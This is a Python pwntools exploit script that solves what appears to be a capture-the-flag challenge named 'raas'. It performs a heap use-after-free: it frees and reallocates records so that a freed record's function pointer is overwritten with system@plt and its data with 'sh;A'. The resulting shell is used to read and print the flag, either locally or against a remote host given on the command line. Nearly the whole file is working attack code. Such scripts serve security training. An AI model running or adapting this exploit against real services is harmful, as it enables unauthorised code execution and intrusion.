from pwn import *
import sys
import re
# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

'''
[*] '/mnt/c/Users/shash/Desktop/Hackme/raas/raas'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

system_plt = 0x80484f0

if len(sys.argv) == 1:
    r = process("./raas_patched")
    # if args.GDB:
    # gdb.attach(r, 'set follow-fork-mode parent')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

# Chunk 1
r.sendlineafter(b"Act >", b"1")
r.sendlineafter(b"Index >", b"1")
r.sendlineafter(b"Type >", b"1")
r.sendlineafter(b"Value >", b"55555")

# Chunk 0
r.sendlineafter(b"Act >", b"1")
r.sendlineafter(b"Index >", b"0")
r.sendlineafter(b"Type >", b"2")
r.sendlineafter(b"Length >", b"40")
r.sendlineafter(b"Value >", b"Never gonna give you up")

# Free chunk 1
r.sendlineafter(b"Act >", b"2")
r.sendlineafter(b"Index >", b"1")

# Free chunk 0
r.sendlineafter(b"Act >", b"2")
r.sendlineafter(b"Index >", b"0")

# Get chunk 0  + chunk 1 back
r.sendlineafter(b"Act >", b"1")
r.sendlineafter(b"Index >", b"2")
r.sendlineafter(b"Type >", b"2")
r.sendlineafter(b"Length >", b"9")
# This is actually modifying chunk 1
r.sendafter(b"Value >", b"sh;A" + p32(system_plt))
# records[idx]->free(records[idx]); -> system(records[idx]) -> system("sh;A" + p32(system_plt))
r.sendlineafter(b"Act >", b"2")
r.sendlineafter(b"Index >", b"1")
# Shell out
r.sendline(b"cat flag")
res = r.recvall(timeout=0.5)
print(re.search(r"FLAG{.*?}", res.decode()).group(0))
r.close()